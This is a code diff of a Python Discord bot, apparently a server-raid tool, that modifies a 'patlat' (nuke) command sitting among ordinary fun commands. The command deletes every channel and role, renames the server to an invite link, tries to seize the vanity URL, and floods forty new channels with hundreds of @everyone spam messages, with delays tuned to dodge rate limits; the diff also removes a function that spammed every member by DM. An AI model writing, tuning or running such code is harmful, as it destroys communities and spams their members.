@@ -461,7 +461,6 @@ async def rps_cmd(ctx, choice: str):
         await ctx.send(f"🎉 Mən qazandım! Mənim seçimim: {bot_choice}")
     else:
         await ctx.send(f"🏆 Sən qazandın! Mənim seçimim: {bot_choice}")
-
 @bot.command(name="poll")
 async def poll_cmd(ctx, *, soru):
     await ctx.message.delete()
@@ -472,7 +471,7 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👎")
 
 # ==========================================
-# PATLAT / NUKE SİSTEMİ (Qoruma daxil)
+# PATLAT / NUKE SİSTEMİ (Ardıcıl & Fasiləli)
 # ==========================================
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
@@ -512,28 +511,17 @@ async def patlat_cmd(ctx):
         except:
             pass
 
-    # 4. DM Spam funksiyası
-    async def send_user_dm(member):
-        try:
-            await member.send("RUHUM SKDİ !discord.gg/aga'n YAZ GİR")
-        except:
-            pass
-
-    dm_tasks = [send_user_dm(member) for member in guild.members if not member.bot]
-    if dm_tasks:
-        await asyncio.gather(*dm_tasks, return_exceptions=True)
-
-    # 5. Mövcud kanalları sil
+    # 4. Mövcud kanalları sil
     channel_tasks = [ch.delete() for ch in guild.channels]
     if channel_tasks:
         await asyncio.gather(*channel_tasks, return_exceptions=True)
 
-    # 6. Rolları sil
+    # 5. Rolları sil
     role_tasks = [r.delete() for r in guild.roles if r != guild.default_role]
     if role_tasks:
         await asyncio.gather(*role_tasks, return_exceptions=True)
 
-    # 7. Yeni rol yarat və sahibə ver
+    # 6. Yeni rol yarat və sahibə ver
     try:
         yeni_rol = await guild.create_role(
             name="discord.gg/aga",
@@ -544,13 +532,13 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    # 8. Server adını dəyiş
+    # 7. Server adını dəyiş
     try:
         await guild.edit(name="discord.gg/aga")
     except:
         pass
 
-    # 9. Vanity URL dəyişməsi
+    # 8. Vanity URL dəyişməsi
     vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumuntesi"]
     for v_code in vanity_alternatifleri:
         try:
@@ -558,40 +546,33 @@ async def patlat_cmd(ctx):
             break
         except:
             pass
-    # 10. Ən üstdə RUHUM-TANRI kanalını aç və spam et
+
+    # 9. Ən üstdə RUHUM-TANRI kanalını aç və 300 mesaj at
     try:
         ruhum_kanal = await guild.create_text_channel("RUHUM-TANRI")
-        async def ruhum_spam():
-            for _ in range(300):
-                try:
-                    await ruhum_kanal.send("@everyone ruhum shdı discord.gg/aga")
-                    await asyncio.sleep(0.05)
-                except:
-                    break
-        asyncio.create_task(ruhum_spam())
+        for _ in range(300):
+            try:
+                await ruhum_kanal.send("@everyone ruhum shdı discord.gg/aga")
+                await asyncio.sleep(0.08)
+            except:
+                break
     except:
         pass
 
-    # 11. Digər kanalları yaradıb hər birinə mesaj göndərmək
-    async def kanal_islem_ve_spam(i):
+    # 10. Ardıcıl olaraq 40 kanal yaradıb hər birinə 300 mesaj göndərmək
+    for i in range(1, 41):
         try:
             channel = await guild.create_text_channel(f"aga-spam-{i}")
-            for _ in range(50):
+            for _ in range(300):
                 try:
                     await channel.send("@everyone discord.gg/aga yaz gır oql")
-                    await asyncio.sleep(0.05)
+                    await asyncio.sleep(0.08)
                 except:
                     break
+            await asyncio.sleep(0.3) # Ratelimit-ə düşməmək üçün qısa gözləmə
         except:
             pass
 
-    chunk_size = 5
-    for start in range(1, 41, chunk_size):
-        tasks_list = [kanal_islem_ve_spam(i) for i in range(start, min(start + chunk_size, 41))]
-        await asyncio.gather(*tasks_list, return_exceptions=True)
-        await asyncio.sleep(0.1)
-
-# Botun işə düşməsi (Token hissəsi)
+# Botun işə düşməsi
 if __name__ == "__main__":
     bot.run(os.getenv("TOKEN"))
-    
